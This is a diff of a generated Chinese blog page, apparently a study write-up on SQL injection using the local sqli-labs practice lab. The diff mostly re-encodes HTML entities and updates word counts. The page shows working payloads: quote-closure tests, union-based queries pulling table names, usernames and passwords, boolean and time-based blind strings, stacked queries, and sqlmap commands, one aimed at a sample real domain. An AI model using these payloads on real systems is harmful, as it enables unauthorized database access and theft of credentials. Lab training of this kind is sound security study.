@@ -365,14 +365,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    3.7k
+                    3.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:
-                    13 分
+                    14 分
                 </div>
                 
 
@@ -412,19 +412,19 @@ limit m,n: 从m条记录开始取n条记录
 <p>注释可以用–+;– -;#把后面的’或者多余的修饰符注释掉，当然不同数据库的注释方法也不尽相同。</p>
 <p>/<em>!</em>/ (内联注释可以放在整个sql语句中)</p>
 <p>下面是一些常用的结构</p>
-<pre class="line-numbers language-none"><code class="language-none">or 1=1--+ 
+<pre class="line-numbers language-none"><code class="language-none">or 1&#x3D;1--+ 
 
-'or 1=1--+ 
+&#39;or 1&#x3D;1--+ 
 
-"or 1=1--+ 
+&quot;or 1&#x3D;1--+ 
 
-)or 1=1--+ 
+)or 1&#x3D;1--+ 
 
-')or 1=1--+ 
+&#39;)or 1&#x3D;1--+ 
 
-") or 1=1--+ 
+&quot;) or 1&#x3D;1--+ 
 
-"))or 1=1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&quot;))or 1&#x3D;1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -433,35 +433,35 @@ limit m,n: 从m条记录开始取n条记录
 <p>1.先找到闭合规则</p>
 <p>2.然后用order by子句查询属性列的字段数,也就是看有多少列</p>
 <p>3.接着就可以获取database()了，先把id换成-1，数据库没有id=-1的数据，这样就可以把所有select起来的数据都显示出来</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到当前的数据库是security</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201220521.png" alt="image-20210208201220521"></p>
 <p>4.查表名</p>
 <p>因为当时union select出来的数据显示2，3</p>
 <p>所以可以在原来2，3的位置插入sql语句，但要用（）将要插入的sql语句包起来</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema ='security'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D;&#39;security&#39;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>5.查用户属性也就是字段</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name &#x3D; &#39;users&#39;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以发现有三个属性</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201234242.png" alt="image-20210208201234242"></p>
 <p>6.查完属性就可以查列了，把username全部调出来</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201319502.png" alt="image-20210208201319502"></p>
 <p>7.最后就是查用户密码了</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>感觉这个全靠猜，但是猜也得讲究技巧呀，比如可以用数据结构学过的二分法去搞</p>
 <p>1.先判断是不是Boolean盲注，如果能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，Boolean顾名思义只存在两种状态，对或错，你看不到任何信息，只有true or false</p>
 <p>比如这题，猜对了只有You are in 显示，猜错了就啥也没有</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201358085.png" alt="image-20210208201358085"></p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=1 --+ 正常
-http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=2 --+ 正常
-http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=2 --+ 不正常
-http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=1 --+ 正常
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1 and 1&#x3D;1 --+ 正常
+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1 and 1&#x3D;2 --+ 正常
+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1&#39; and 1&#x3D;2 --+ 不正常
+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1&#39; and 1&#x3D;1 --+ 正常
 综上可以判断是字符串盲注了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>2.根据返回状态判断闭合规则</p>
@@ -507,9 +507,9 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 <p>就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是没有延时)，由此来推出数据库长度。</p>
 </li>
 <li><p>判断当前数据库名的第一个和第二个字母的语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)&#x3D;&#39;s&#39;,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。</p>
 </li>
@@ -523,7 +523,7 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 </li>
 <li><p>堆叠注入的语句为</p>
 <pre class="line-numbers language-none"><code class="language-none">;select if(length(database())&gt;1,sleep(3),1)
-;select if(substr(database(),1,1)='r',sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+;select if(substr(database(),1,1)&#x3D;&#39;r&#39;,sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </li>
 <li><p>按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。</p>
 </li>
@@ -596,8 +596,8 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 6：同时显示 HTTP 响应体。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="2-指定目标-U"><a href="#2-指定目标-U" class="headerlink" title="2.指定目标 U"></a>2.指定目标 <code>U</code></h4><p>使用参数 <code>-u</code> 或 <code>–url</code> 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "www.baidu.com/user.php?id=7"
-sqlmap.py -url "www.baidu.com:8080/user.php?id=7"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u &quot;www.baidu.com&#x2F;user.php?id&#x3D;7&quot;
+sqlmap.py -url &quot;www.baidu.com:8080&#x2F;user.php?id&#x3D;7&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h4 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 <code>dbs</code></h4><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 <code>--dbs</code></p>
 <h4 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 <code>tables</code></h4><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 <code>-D ‘库名’ --tables</code></p>
@@ -989,7 +989,7 @@ sqlmap.py -url "www.baidu.com:8080/user.php?id=7"<span aria-hidden="true" class=
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">34.8k</span>&nbsp;字
+                class="white-color">36.1k</span>&nbsp;字
             
             
             
